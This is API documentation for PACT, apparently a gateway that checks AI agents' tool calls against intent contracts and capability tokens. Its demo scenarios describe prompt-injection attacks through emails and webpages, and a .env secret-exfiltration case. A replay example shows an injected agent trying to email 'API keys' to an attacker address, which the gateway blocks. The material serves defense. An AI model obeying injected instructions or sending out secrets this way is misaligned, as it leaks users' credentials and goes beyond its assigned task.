# PACT API Reference

> **Base URL:** `http://localhost:8000`
> **Protocol Version:** PACT/0.1
> **Interactive Docs:** `http://localhost:8000/docs` (Swagger UI)

---

## Table of Contents

- [Health](#health)
  - [GET /health](#get-health)
- [Agents](#agents)
  - [POST /agents/register](#post-agentsregister)
  - [GET /agents](#get-agents)
  - [GET /agents/{agent_id}](#get-agentsagent_id)
- [Intents](#intents)
  - [POST /intents/create](#post-intentscreate)
  - [GET /intents/{intent_id}](#get-intentsintent_id)
- [Capabilities](#capabilities)
  - [POST /capabilities/issue](#post-capabilitiesissue)
  - [POST /capabilities/validate](#post-capabilitiesvalidate)
- [Tools](#tools)
  - [POST /tools/call](#post-toolscall)
- [Scenarios](#scenarios)
  - [GET /scenarios](#get-scenarios)
  - [POST /scenarios/run/{name}](#post-scenariosrunname)
- [Runs](#runs)
  - [GET /runs](#get-runs)
  - [GET /runs/{run_id}](#get-runsrun_id)
  - [GET /runs/{run_id}/replay](#get-runsrun_idreplay)
  - [GET /runs/{run_id}/ledger/verify](#get-runsrun_idledgerverify)
- [Dashboard](#dashboard)
  - [GET /dashboard/overview](#get-dashboardoverview)
  - [GET /dashboard/agents](#get-dashboardagents)
  - [GET /dashboard/risk-timeline](#get-dashboardrisk-timeline)
  - [GET /dashboard/blocked-actions](#get-dashboardblocked-actions)

---

## Health

### GET /health

Check if the PACT backend is running.

**Request:** No body required.

```bash
curl http://localhost:8000/health
```

**Response:** `200 OK`

```json
{
  "status": "ok",
  "service": "pact-backend",
  "version": "0.1.0"
}
```

---

## Agents

### POST /agents/register

Register a new AI agent. Returns the agent's passport and private key (the private key is only returned once at registration time).

**Request Body:**

```json
{
  "agent_id": "email-agent-001",
  "owner": "team-pact",
  "agent_type": "email_assistant",
  "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
  "risk_tier": "medium"
}
```

| Field | Type | Required | Description |
|---|---|---|---|
| `agent_id` | string | Yes | Unique identifier for the agent |
| `owner` | string | Yes | Team or organization that owns the agent |
| `agent_type` | string | Yes | Functional type (e.g., `email_assistant`) |
| `allowed_domains` | string[] | Yes | Tool domains the agent is permitted to use |
| `risk_tier` | string | Yes | Risk classification: `low`, `medium`, `high`, `critical` |

```bash
curl -X POST http://localhost:8000/agents/register \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "email-agent-001",
    "owner": "team-pact",
    "agent_type": "email_assistant",
    "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
    "risk_tier": "medium"
  }'
```

**Response:** `200 OK`

```json
{
  "passport": {
    "agent_id": "email-agent-001",
    "owner": "team-pact",
    "agent_type": "email_assistant",
    "public_key": "base64-encoded-ed25519-public-key...",
    "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
    "risk_tier": "medium",
    "issued_at": "2026-05-24T10:00:00Z",
    "expires_at": "2026-06-24T10:00:00Z",
    "issuer_signature": "base64-encoded-signature..."
  },
  "agent_private_key": "base64-encoded-ed25519-private-key...",
  "warning": "Store the agent_private_key securely. It will not be shown again."
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `400` | Invalid request body or missing required fields |
| `409` | Agent with this `agent_id` already exists |

---

### GET /agents

List all registered agents.

```bash
curl http://localhost:8000/agents
```

**Response:** `200 OK`

```json
[
  {
    "agent_id": "email-agent-001",
    "owner": "team-pact",
    "agent_type": "email_assistant",
    "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
    "risk_tier": "medium",
    "status": "active",
    "created_at": "2026-05-24T10:00:00Z",
    "expires_at": "2026-06-24T10:00:00Z"
  },
  {
    "agent_id": "web-agent-001",
    "owner": "team-pact",
    "agent_type": "web_researcher",
    "allowed_domains": ["web.read", "summarize", "respond_to_user"],
    "risk_tier": "medium",
    "status": "active",
    "created_at": "2026-05-24T10:00:00Z",
    "expires_at": "2026-06-24T10:00:00Z"
  }
]
```

---

### GET /agents/{agent_id}

Get a specific agent's passport.

```bash
curl http://localhost:8000/agents/email-agent-001
```

**Response:** `200 OK`

```json
{
  "agent_id": "email-agent-001",
  "owner": "team-pact",
  "agent_type": "email_assistant",
  "public_key": "base64-encoded-ed25519-public-key...",
  "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
  "risk_tier": "medium",
  "issued_at": "2026-05-24T10:00:00Z",
  "expires_at": "2026-06-24T10:00:00Z",
  "issuer_signature": "base64-encoded-signature..."
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `404` | Agent not found |

---

## Intents

### POST /intents/create

Create an intent contract from a user's natural-language goal. The system classifies the goal and produces a deterministic set of allowed/forbidden actions.

**Request Body:**

```json
{
  "user_goal": "Summarize my latest invoice email"
}
```

| Field | Type | Required | Description |
|---|---|---|---|
| `user_goal` | string | Yes | The user's original goal in natural language |

```bash
curl -X POST http://localhost:8000/intents/create \
  -H "Content-Type: application/json" \
  -d '{
    "user_goal": "Summarize my latest invoice email"
  }'
```

**Response:** `200 OK`

```json
{
  "intent_id": "intent_a1b2c3d4",
  "user_goal": "Summarize my latest invoice email",
  "allowed_actions": ["email.read", "summarize", "respond_to_user"],
  "forbidden_actions": ["email.send", "email.delete", "file.read_secret", "shell.execute_mock"],
  "risk_budget": "low",
  "approval_required_for": ["external_write", "delete", "payment", "secret_access", "shell"],
  "intent_hash": "sha256:a1b2c3d4e5f6...",
  "created_at": "2026-05-24T10:00:00Z"
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `400` | Invalid request body |
| `404` | Agent not found |

---

### GET /intents/{intent_id}

Get an existing intent contract.

```bash
curl http://localhost:8000/intents/intent_a1b2c3d4
```

**Response:** `200 OK`

```json
{
  "intent_id": "intent_a1b2c3d4",
  "user_goal": "Summarize my latest invoice email",
  "allowed_actions": ["email.read", "summarize", "respond_to_user"],
  "forbidden_actions": ["email.send", "email.delete", "file.read_secret", "shell.execute_mock"],
  "risk_budget": "low",
  "approval_required_for": ["external_write", "delete", "payment", "secret_access", "shell"],
  "intent_hash": "sha256:a1b2c3d4e5f6...",
  "created_at": "2026-05-24T10:00:00Z"
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `404` | Intent not found |

---

## Capabilities

> **Signature Coverage:** The signature covers only immutable token fields (`token_type`, `token_hash`, `agent_id`, `intent_hash`, `capability`, `resource`, `max_uses`, `expires_at`). The mutable field `uses_remaining` is **not** included in the signature — it is decremented on each use without invalidating the signature.

### POST /capabilities/issue

Issue a short-lived capability token granting an agent permission to use a specific tool on a specific resource, bound to an intent.

**Request Body:**

```json
{
  "agent_id": "email-agent-001",
  "intent_hash": "sha256:a1b2c3d4e5f6...",
  "capability": "email.read",
  "resource": "latest_invoice_email",
  "max_uses": 3,
  "ttl_seconds": 300
}
```

| Field | Type | Required | Description |
|---|---|---|---|
| `agent_id` | string | Yes | Agent this token is issued to |
| `intent_hash` | string | Yes | Intent contract hash this token is bound to |
| `capability` | string | Yes | The specific tool action this token permits |
| `resource` | string | No | The specific resource this token grants access to (default: `"default"`) |
| `max_uses` | integer | No | Maximum number of times this token can be used (default: 5) |
| `ttl_seconds` | integer | No | Token lifetime in seconds (default: 300) |

```bash
curl -X POST http://localhost:8000/capabilities/issue \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "email-agent-001",
    "intent_hash": "sha256:a1b2c3d4e5f6...",
    "capability": "email.read",
    "resource": "latest_invoice_email",
    "max_uses": 3,
    "ttl_seconds": 300
  }'
```

**Response:** `200 OK`

```json
{
  "token_type": "PACT-CAP",
  "token_hash": "sha256:e5f6a7b8...",
  "agent_id": "email-agent-001",
  "intent_hash": "sha256:a1b2c3d4e5f6...",
  "capability": "email.read",
  "resource": "latest_invoice_email",
  "max_uses": 3,
  "uses_remaining": 3,
  "expires_at": "2026-05-24T10:05:00Z",
  "status": "active"
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `400` | Invalid request body |
| `404` | Agent not found |

---

### POST /capabilities/validate

Validate a capability token. Checks token existence, status, agent binding, intent binding, capability match, resource binding (when provided), expiry, remaining uses, and signature verification.

**Request Body:**

```json
{
  "token_hash": "sha256:e5f6a7b8...",
  "agent_id": "email-agent-001",
  "intent_hash": "sha256:a1b2c3d4e5f6...",
  "capability": "email.read",
  "resource": "latest_invoice_email"
}
```

| Field | Type | Required | Description |
|---|---|---|---|
| `token_hash` | string | Yes | SHA-256 hash of the capability token to validate |
| `agent_id` | string | Yes | Agent ID to validate against |
| `intent_hash` | string | Yes | Intent hash to validate against |
| `capability` | string | Yes | Capability/action to validate against |
| `resource` | string | No | Resource to validate against (defaults to empty string) |

```bash
curl -X POST http://localhost:8000/capabilities/validate \
  -H "Content-Type: application/json" \
  -d '{
    "token_hash": "sha256:e5f6a7b8...",
    "agent_id": "email-agent-001",
    "intent_hash": "sha256:a1b2c3d4e5f6...",
    "capability": "email.read",
    "resource": "latest_invoice_email"
  }'
```

**Response:** `200 OK`

```json
{
  "valid": true,
  "reason": "Valid"
}
```

**Invalid Response:**

```json
{
  "valid": false,
  "reason": "Token expired"
}
```

> **Note:** The `signature` covers only the immutable token fields (`token_type`, `token_hash`, `agent_id`, `intent_hash`, `capability`, `resource`, `max_uses`, `expires_at`). The mutable field `uses_remaining` is **not** included in the signature — it is decremented on each use without invalidating the signature.

> **Resource Validation:** When the `resource` field is provided (non-empty), the validator checks that the token's `resource` matches the requested resource. When omitted or empty (the default), the resource binding check is skipped — the token is validated against agent, intent, and capability only.

**Error Codes:**

| Code | Description |
|---|---|
| `400` | Invalid request body |
| `404` | Token not found |

---

## Tools

### POST /tools/call

Execute a tool call through the PACT Gateway. **Only accepts PACT Action Envelopes** — raw tool calls are always rejected.

**Request Body:** A `ToolCallRequest` wrapping the envelope and an optional `run_id`.

```json
{
  "envelope": {
    "protocol": "PACT/0.1",
    "run_id": "run_abc123",
    "step_id": 0,
    "agent_id": "email-agent-001",
    "tool": "email.read",
    "args": {"email_id": "latest"},
    "args_digest": "sha256:...",
    "intent_hash": "sha256:a1b2c3d4...",
    "capability_token_hash": "sha256:e5f6a7b8...",
    "provenance": {
      "influenced_by": ["trusted.user"],
      "uses_data": [],
      "side_effect": null
    },
    "parent_action_hash": null,
    "timestamp": "2026-05-24T10:01:00Z",
    "agent_signature": "base64-encoded-signature..."
  },
  "run_id": ""
}
```

| Field | Type | Required | Description |
|---|---|---|---|
| `envelope` | object | Yes | A complete PACT Action Envelope (see [Action Envelope](#post-toolscall)) |
| `run_id` | string | No | Optional run ID override. If empty, the `run_id` from the envelope is used. If both are empty, a new run ID is generated. |

```bash
curl -X POST http://localhost:8000/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "envelope": {
      "protocol": "PACT/0.1",
      "run_id": "run_abc123",
      "step_id": 0,
      "agent_id": "email-agent-001",
      "tool": "email.read",
      "args": {"email_id": "latest"},
      "args_digest": "sha256:...",
      "intent_hash": "sha256:a1b2c3d4...",
      "capability_token_hash": "sha256:e5f6a7b8...",
      "provenance": {
        "influenced_by": ["trusted.user"],
        "uses_data": [],
        "side_effect": null
      },
      "parent_action_hash": null,
      "timestamp": "2026-05-24T10:01:00Z",
      "agent_signature": "base64-encoded-signature..."
    },
    "run_id": ""
  }'
```

**Response (Allowed):** `200 OK`

```json
{
  "decision": "ALLOW",
  "risk_score": 0,
  "severity": "low",
  "reasons": ["Action is valid and aligned with intent"],
  "tool_result": {
    "type": "email",
    "id": "email-001",
    "from": "acme-invoices@example.com",
    "to": "user@example.com",
    "subject": "Invoice #1234 from Acme Corp",
    "body": "Please find attached invoice #1234 for $1,250.00 due May 15.",
    "date": "2026-05-20T09:15:00Z",
    "attachments": []
  },
  "action_hash": "sha256:abc123...",
  "run_id": "run_abc123"
}
```

**Response (Blocked):** `200 OK`

```json
{
  "decision": "BLOCK",
  "risk_score": 96,
  "severity": "critical",
  "reasons": [
    "email.send not allowed by intent contract",
    "External write influenced by untrusted email content"
  ],
  "tool_result": null,
  "action_hash": "sha256:def456...",
  "run_id": "run_abc123"
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `400` | Missing or malformed envelope |
| `200` | Invalid agent signature (returned as 200 with `decision: BLOCK`) |
| `200` | Action blocked by policy (returned as 200 with `decision: BLOCK`) |

---

## Scenarios

### GET /scenarios

List all available demo scenarios.

```bash
curl http://localhost:8000/scenarios
```

**Response:** `200 OK`

```json
[
  {
    "name": "normal_email_summary",
    "description": "User asks to summarize an invoice email. All actions are safe and allowed.",
    "expected_outcome": "ALLOW"
  },
  {
    "name": "malicious_email_injection",
    "description": "Agent reads a malicious email with prompt injection, then attempts to send email externally.",
    "expected_outcome": "BLOCK"
  },
  {
    "name": "fake_agent_identity",
    "description": "A fake/unregistered agent tries to read email.",
    "expected_outcome": "BLOCK"
  },
  {
    "name": "expired_capability_token",
    "description": "Legitimate agent uses an expired capability token.",
    "expected_outcome": "BLOCK"
  },
  {
    "name": "secret_exfiltration",
    "description": "Agent reads a .env secret file, then attempts to send content externally.",
    "expected_outcome": "BLOCK"
  },
  {
    "name": "malicious_webpage",
    "description": "Agent reads a webpage with hidden prompt injection, then attempts external send.",
    "expected_outcome": "BLOCK"
  }
]
```

---

### POST /scenarios/run/{name}

Execute a named demo scenario through the full PACT pipeline. The system creates the agent, intent, capability tokens, and runs all steps through the gateway automatically.

```bash
curl -X POST http://localhost:8000/scenarios/run/malicious_email_injection
```

**Path Parameters:**

| Parameter | Type | Description |
|---|---|---|
| `name` | string | Scenario name (e.g., `normal_email_summary`, `malicious_email_injection`) |

**Response:** `200 OK`

```json
{
  "run_id": "run_x7y8z9",
  "scenario_name": "malicious_email_injection",
  "status": "completed",
  "total_actions": 2,
  "allowed_actions": 1,
  "blocked_actions": 1,
  "max_risk_score": 96
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `404` | Scenario not found |

---

## Runs

### GET /runs

List all agent runs (scenario executions and manual tool calls).

```bash
curl http://localhost:8000/runs
```

**Response:** `200 OK`

```json
[
  {
    "run_id": "run_x7y8z9",
    "agent_id": "email-agent-001",
    "scenario_name": "malicious_email_injection",
    "user_goal": "Summarize my latest invoice email",
    "status": "completed",
    "started_at": "2026-05-24T10:01:00Z",
    "completed_at": "2026-05-24T10:01:02Z",
    "total_actions": 2,
    "allowed_actions": 1,
    "blocked_actions": 1,
    "max_risk_score": 96,
    "ledger_valid": true
  }
]
```

---

### GET /runs/{run_id}

Get detailed information about a specific run, including all actions and their policy decisions.

```bash
curl http://localhost:8000/runs/run_x7y8z9
```

**Response:** `200 OK`

```json
{
  "run_id": "run_x7y8z9",
  "agent_id": "email-agent-001",
  "scenario_name": "malicious_email_injection",
  "user_goal": "Summarize my latest invoice email",
  "status": "completed",
  "started_at": "2026-05-24T10:01:00Z",
  "completed_at": "2026-05-24T10:01:02Z",
  "actions": [
    {
      "step_id": 0,
      "agent_id": "email-agent-001",
      "tool": "email.read",
      "args_digest": "sha256:...",
      "intent_hash": "sha256:a1b2c3d4...",
      "provenance": {
        "influenced_by": ["trusted.user"],
        "uses_data": [],
        "side_effect": null
      },
      "parent_action_hash": null,
      "action_hash": "sha256:...",
      "status": "allowed",
      "created_at": "2026-05-24T10:01:00Z",
      "policy_decision": {
        "decision": "ALLOW",
        "risk_score": 0,
        "severity": "low",
        "reasons": ["Action is valid and aligned with intent"]
      }
    },
    {
      "step_id": 1,
      "agent_id": "email-agent-001",
      "tool": "email.send",
      "args_digest": "sha256:...",
      "intent_hash": "sha256:a1b2c3d4...",
      "provenance": {
        "influenced_by": ["untrusted.email", "agent.generated"],
        "uses_data": [],
        "side_effect": "external_write"
      },
      "parent_action_hash": "sha256:...",
      "action_hash": "sha256:...",
      "status": "blocked",
      "created_at": "2026-05-24T10:01:01Z",
      "policy_decision": {
        "decision": "BLOCK",
        "risk_score": 96,
        "severity": "critical",
        "reasons": [
          "email.send not allowed by intent contract",
          "External write influenced by untrusted email content"
        ]
      }
    }
  ]
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `404` | Run not found |

---

### GET /runs/{run_id}/replay

Get step-by-step replay data optimized for frontend visualization. Includes envelope details, provenance context, and policy decisions for each step.

```bash
curl http://localhost:8000/runs/run_x7y8z9/replay
```

**Response:** `200 OK`

```json
{
  "run_id": "run_x7y8z9",
  "scenario_name": "malicious_email_injection",
  "user_goal": "Summarize my latest invoice email",
  "steps": [
    {
      "step_id": 0,
      "timestamp": "2026-05-24T10:01:00Z",
      "agent_id": "email-agent-001",
      "tool": "email.read",
      "args": {"email_id": "malicious_invoice_email"},
      "provenance": {
        "influenced_by": ["trusted.user"],
        "uses_data": [],
        "side_effect": null
      },
      "envelope": {
        "protocol": "PACT/0.1",
        "run_id": "run_x7y8z9",
        "step_id": 0,
        "agent_id": "email-agent-001",
        "tool": "email.read",
        "args": {"email_id": "malicious_invoice_email"},
        "args_digest": "sha256:...",
        "intent_hash": "sha256:a1b2c3d4...",
        "capability_token_hash": "sha256:...",
        "provenance": {"influenced_by": ["trusted.user"], "uses_data": [], "side_effect": null},
        "parent_action_hash": null,
        "timestamp": "2026-05-24T10:01:00Z",
        "agent_signature": "base64..."
      },
      "policy_decision": {
        "decision": "ALLOW",
        "risk_score": 0,
        "severity": "low",
        "reasons": ["Action is valid and aligned with intent"]
      },
      "action_hash": "sha256:...",
      "parent_action_hash": null,
      "signature_valid": true,
      "chain_valid": true
    },
    {
      "step_id": 1,
      "timestamp": "2026-05-24T10:01:01Z",
      "agent_id": "email-agent-001",
      "tool": "email.send",
      "args": {"to": "attacker@gmail.com", "subject": "Stolen Data", "body": "API keys..."},
      "provenance": {
        "influenced_by": ["untrusted.email", "agent.generated"],
        "uses_data": [],
        "side_effect": "external_write"
      },
      "envelope": {
        "protocol": "PACT/0.1",
        "run_id": "run_x7y8z9",
        "step_id": 1,
        "agent_id": "email-agent-001",
        "tool": "email.send",
        "args": {"to": "attacker@gmail.com", "subject": "Stolen Data", "body": "API keys..."},
        "args_digest": "sha256:...",
        "intent_hash": "sha256:a1b2c3d4...",
        "capability_token_hash": "sha256:...",
        "provenance": {"influenced_by": ["untrusted.email", "agent.generated"], "uses_data": [], "side_effect": "external_write"},
        "parent_action_hash": "sha256:...",
        "timestamp": "2026-05-24T10:01:01Z",
        "agent_signature": "base64..."
      },
      "policy_decision": {
        "decision": "BLOCK",
        "risk_score": 96,
        "severity": "critical",
        "reasons": [
          "email.send not allowed by intent contract",
          "External write influenced by untrusted email content"
        ]
      },
      "action_hash": "sha256:...",
      "parent_action_hash": "sha256:...",
      "signature_valid": true,
      "chain_valid": true
    }
  ],
  "ledger_valid": true
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `404` | Run not found |

---

### GET /runs/{run_id}/ledger/verify

Verify the hash-chain integrity of a run's action ledger.

```bash
curl http://localhost:8000/runs/run_x7y8z9/ledger/verify
```

**Response:** `200 OK`

```json
{
  "run_id": "run_x7y8z9",
  "valid": true,
  "issues": []
}
```

If the chain is broken, `valid` is `false` and `issues` contains human-readable descriptions of each problem:

```json
{
  "run_id": "run_x7y8z9",
  "valid": false,
  "issues": [
    "Step 1: parent hash mismatch (expected sha256:abc..., got sha256:xyz...)",
    "Step 1: hash mismatch (expected sha256:def..., got sha256:ghi...)"
  ]
}
```

**Error Codes:**

| Code | Description |
|---|---|
| `404` | Run not found |

---

## Dashboard

### GET /dashboard/overview

Get aggregate metrics across all runs.

```bash
curl http://localhost:8000/dashboard/overview
```

**Response:** `200 OK`

```json
{
  "total_runs": 6,
  "total_actions": 14,
  "allowed_actions": 7,
  "blocked_actions": 6,
  "critical_events": 4,
  "top_attacked_tools": [
    {"tool": "email.send", "count": 4},
    {"tool": "file.read_secret", "count": 1},
    {"tool": "shell.execute_mock", "count": 1}
  ],
  "top_provenance_sources": [
    {"source": "untrusted.email", "count": 3},
    {"source": "external_write", "count": 5},
    {"source": "secret", "count": 1}
  ],
  "risk_timeline": [
    {
      "timestamp": "2026-05-24T10:01:00Z",
      "risk_score": 0,
      "severity": "low",
      "decision": "ALLOW"
    },
    {
      "timestamp": "2026-05-24T10:02:00Z",
      "risk_score": 96,
      "severity": "critical",
      "decision": "BLOCK"
    }
  ]
}
```

---

### GET /dashboard/agents

Get agent-level trust scores and activity summaries.

```bash
curl http://localhost:8000/dashboard/agents
```

**Response:** `200 OK`

```json
[
  {
    "agent_id": "email-agent-001",
    "owner": "team-pact",
    "risk_tier": "medium",
    "trust_score": 60,
    "total_runs": 4,
    "blocked_actions": 4,
    "status": "active"
  },
  {
    "agent_id": "web-agent-001",
    "owner": "team-pact",
    "risk_tier": "medium",
    "trust_score": 90,
    "total_runs": 2,
    "blocked_actions": 1,
    "status": "active"
  }
]
```

---

### GET /dashboard/risk-timeline

Get risk score data over time, suitable for charting.

```bash
curl http://localhost:8000/dashboard/risk-timeline
```

**Response:** `200 OK`

```json
[
  {
    "timestamp": "2026-05-24T10:01:00Z",
    "risk_score": 0,
    "severity": "low",
    "decision": "ALLOW",
    "run_id": "run_abc"
  },
  {
    "timestamp": "2026-05-24T10:02:00Z",
    "risk_score": 96,
    "severity": "critical",
    "decision": "BLOCK",
    "run_id": "run_def"
  }
]
```

---

### GET /dashboard/blocked-actions

Get recent blocked actions across all runs.

```bash
curl http://localhost:8000/dashboard/blocked-actions
```

**Response:** `200 OK`

```json
[
  {
    "run_id": "run_def",
    "step_id": 1,
    "agent_id": "email-agent-001",
    "tool": "email.send",
    "risk_score": 96,
    "severity": "critical",
    "reasons": [
      "email.send not allowed by intent contract",
      "External write influenced by untrusted email content"
    ],
    "timestamp": "2026-05-24T10:02:01Z"
  }
]
```

---

## Error Response Format

All error responses follow this format:

```json
{
  "detail": "Human-readable error message"
}
```

## Rate Limiting

No rate limiting is implemented in the MVP.

## Authentication

The API does not require authentication in the MVP. In production, the API should be protected with standard HTTP authentication (e.g., API keys or OAuth2) — agent-level authentication is handled by PACT passports and signatures at the protocol level.
